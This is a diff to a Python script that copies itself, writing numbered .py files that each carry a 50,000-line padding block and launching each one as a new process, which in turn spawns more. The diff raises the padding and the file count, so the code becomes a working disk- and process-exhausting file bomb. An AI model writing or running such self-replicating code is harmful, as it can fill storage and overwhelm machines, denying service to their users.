@@ -1,16 +1,16 @@
-import random as r
-import subprocess as s
 import multiprocessing as mp
 import os
+import random as r
+import subprocess as s
 
 name = os.path.splitext(os.path.basename(__file__))[0]
 
-randoNum = 60
-externalRunAmount = 5
-firstRunAmount = 10
+numFiles = 1000
+externalRunAmount = 1
+firstRunAmount = 2
 
 contents = f'''
-import {name} as m
+from {name} import writeFile
 import random as r
 import subprocess as s
 import multiprocessing as mp
@@ -18,46 +18,43 @@ import os
 name = os.path.splitext(os.path.basename(__file__))[0]
 def runFile(i):
     filename = "python " + str(i) + ".py"
-    s.Popen(filename, shell=False)
+    s.Popen(filename)
 def handleFile(i):
     file = os.getcwd() + "\\\\" + str(i) + ".py"
     if not os.path.isfile(file):
-        m.writeFile(f"{{i}}.py", m.contents)
+        writeFile(f"{{i}}.py")
     runFile(i)
 def main():
     for a in range({externalRunAmount}):
-        i = r.randint(0, {randoNum})
+        i = r.randint(1, {numFiles})
         if __name__ == "__main__":
+            print(f"Running {{name}}.py")
             mp.Process(target=handleFile, args=(i,)).start()
-            print(name)
 main()
-''' + "##################################################\n" * 10000
+''' + "#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" * 50000
 
 
-def writeFile(fileName, contents):
-    fileContents = ""
+def writeFile(fileName):
+    print(f"Creating {fileName}!")
     with open(fileName, 'w') as openFile:
-        for i in contents:
-            openFile.write(str(i))
-            fileContents += str(i)
-    print(f"Created {fileName}.py!")
+        openFile.write(contents)
 
 
 def runFile(i):
     filename = "python " + str(i) + ".py"
-    s.Popen(filename, shell=False)
+    s.Popen(filename)
 
 
 def handleFile(i):
     file = os.getcwd() + "\\" + str(i) + ".py"
     if not os.path.isfile(file):
-        writeFile(f"{i}.py", contents)
+        writeFile(f"{i}.py")
     runFile(i)
 
 
 def main():
     for a in range(firstRunAmount):
-        i = r.randint(0, randoNum)
+        i = r.randint(1, numFiles)
         mp.Process(target=handleFile, args=(i,)).start()
 
 
